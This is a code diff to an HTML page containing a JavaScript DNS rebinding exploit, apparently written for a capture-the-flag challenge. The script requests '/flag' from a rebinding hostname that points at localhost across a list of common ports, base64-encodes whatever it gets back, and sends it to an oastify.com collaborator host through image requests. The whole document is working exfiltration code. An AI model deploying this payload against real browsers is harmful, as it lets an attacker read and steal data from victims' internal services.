@@ -2,26 +2,23 @@
 <html>
 <body>
 <script>
-const target = 'acd918ee.7f000001.rbndr.us:80';
+const target = 'acd918ee.7f000001.rbndr.us';
+const ports = [80, 8080, 3000, 5000, 8000, 8081, 8443, 9000, 3001, 4000];
 
-function attempt(round) {
-    fetch(`http://${target}/flag`)
-        .then(r => r.text())
-        .then(flag => {
-            // If we get here, DNS rebinding worked and we got the flag!
-            const img = new Image();
-            img.src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?flag_${round}=` + btoa(flag);
-        })
-        .catch(err => {
-            const img = new Image();
-            img.src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?error_${round}=` + btoa(err.toString());
-        });
-}
-
-// Rapid attempts to catch DNS rebind
-for (let i = 1; i <= 100; i++) {
-    setTimeout(() => attempt(i), i * 200);
-}
+ports.forEach((port, i) => {
+    setTimeout(() => {
+        fetch(`http://${target}:${port}/flag`)
+            .then(r => r.text())
+            .then(flag => {
+                const img = new Image();
+                img.src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?success_${port}=` + btoa(flag);
+            })
+            .catch(err => {
+                const img = new Image();
+                img.src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?error_${port}=` + btoa(err.toString());
+            });
+    }, i * 1000);
+});
 </script>
 </body>
 </html>
